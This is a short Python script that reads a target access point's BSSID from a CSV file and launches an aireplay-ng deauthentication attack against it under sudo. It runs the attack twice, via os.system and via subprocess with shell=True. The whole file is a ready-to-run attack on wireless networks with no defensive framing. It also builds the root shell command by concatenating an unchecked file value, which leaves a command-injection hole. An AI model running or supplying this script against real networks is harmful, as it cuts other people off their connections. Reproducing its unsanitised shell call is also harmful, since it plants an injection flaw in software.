import subprocess#import
import os
import time
from time import sleep
import csv
import sys
import platform
from subprocess import Popen


times=4


affix='monitor'#+str(time.time())
#+str(time.time())
pathi=''+affix
affic='airodump'#+str(time.time())
path='/home/pegasus/Desktop/DATA/'+affix
path2='/home/pegasus/Desktop/DATA/'+affic

def main():
	
	with open('temp.csv', 'r') as csv_file:
		reader = csv.reader(csv_file)
		thenet = dict(reader)

	bssid=thenet['BSSID']
	channel=thenet['channel']
	essid=thenet['ESSID']
	
	print(essid,bssid,channel)
	
	sleep(1)

	bash='sudo aireplay-ng -0 4 -a '+bssid+' --ignore-negative-one mon0'
	print(bash)
	sleep(3)
	os.system(bash)
	subprocess.Popen(bash, shell=True)

	
	
main()